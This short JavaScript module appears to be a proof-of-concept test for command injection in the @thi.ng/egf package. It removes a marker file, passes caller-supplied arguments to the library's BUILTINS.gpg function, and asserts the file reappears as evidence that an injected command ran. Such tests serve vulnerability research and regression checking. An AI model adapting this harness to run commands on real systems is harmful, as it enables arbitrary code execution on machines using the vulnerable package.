function exploitFunction(command, args, opts) {
    const egf = require("@thi.ng/egf");
    const fs = require("fs");
    const path = "./egf";

    try {
        if (fs.existsSync(path)) {
            fs.unlinkSync(path);
            console.log("File removed:", path);
        }
    } catch (err) {
        console.error(err);
    }

    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(false);

    try {
        egf.BUILTINS.gpg(command, args, opts);  // Ensure the command is correctly passed
    } catch (error) {}

    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {});
}

module.exports = { exploitFunction };